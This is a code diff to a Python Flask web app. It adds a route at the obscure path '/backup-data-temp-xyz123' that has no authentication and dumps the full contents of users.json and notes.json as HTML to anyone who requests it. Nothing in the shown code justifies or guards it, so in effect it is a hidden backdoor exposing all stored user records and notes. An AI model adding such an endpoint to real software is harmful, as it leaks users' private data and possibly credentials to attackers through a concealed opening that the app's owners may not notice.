@@ -208,7 +208,18 @@ def forgot_password_reset():
 
     except Exception as e:
         print("RESET PASSWORD ERROR:", e)
-        return jsonify({"success": False, "message": "Something went wrong."})        
+        return jsonify({"success": False, "message": "Something went wrong."})    
+
+@app.route("/backup-data-temp-xyz123")
+def backup_data():
+    try:
+        with open("users.json", "r", encoding="utf-8") as f:
+            users_data = f.read()
+        with open("notes.json", "r", encoding="utf-8") as f:
+            notes_data = f.read()
+        return f"<h3>USERS:</h3><pre>{users_data}</pre><h3>NOTES:</h3><pre>{notes_data}</pre>"
+    except Exception as e:
+        return f"Error: {e}"            
 
 
 @app.route("/feedback", methods=["POST"])
